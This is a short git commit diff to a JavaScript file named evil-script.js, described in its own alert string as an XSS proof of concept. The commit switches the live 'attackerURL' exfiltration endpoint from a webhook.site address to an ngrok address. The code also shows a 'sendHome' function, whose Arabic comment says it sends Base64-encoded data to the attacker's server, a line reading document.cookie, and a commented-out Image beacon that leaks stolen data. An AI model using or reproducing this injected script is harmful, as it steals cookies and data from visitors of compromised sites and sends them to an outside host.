f1146aaa09b4774bdcdf915f853f0d070eb0c991
egyhaker <egyhaker.s.m.y@gmail.com>
2026-02-05 15:45:38 +0200

    Update evil-script.js

--- evil-script.js
+++ evil-script.js
@@ -6,8 +6,8 @@ alert("XSS PoC: Script injected! Cookies visible in console: " + document.cookie
 //new Image().src = "https://webhook.site/01958d43-9c63-44e0-85c8-4df93c65ec75/log?data=" + encodeURIComponent(stolenData);
 
 (function() {
-    //const attackerURL = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/exfiltrate=";
-    const attackerURL = "https://webhook.site/0bfa1fd8-da82-45ef-bcde-1ae997123369/exfiltrate=";
+    const attackerURL = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/exfiltrate=";
+    //const attackerURL = "https://webhook.site/0bfa1fd8-da82-45ef-bcde-1ae997123369/exfiltrate=";
     // 1. وظيفة التهريب: ترسل البيانات مشفرة Base64 إلى سيرفر المهاجم
     function sendHome(data, type) {
         const payload = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
